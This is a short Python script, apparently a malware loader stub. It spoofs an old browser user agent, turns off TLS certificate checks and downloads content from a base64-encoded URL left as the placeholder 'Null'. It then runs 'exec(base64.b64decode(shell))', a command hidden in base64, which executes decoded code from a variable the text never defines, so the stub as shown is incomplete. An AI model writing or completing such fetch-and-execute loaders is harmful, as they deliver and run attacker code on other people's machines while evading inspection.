import ctypes
import requests
import base64

url="Null"

headers = {
    'User-Agent': "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
}
requests.packages.urllib3.disable_warnings()
s = requests.get(base64.b64decode(url),headers=headers,verify=False)
s = bytearray(s.content)


eval(base64.b64decode("ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHNoZWxsKSk="))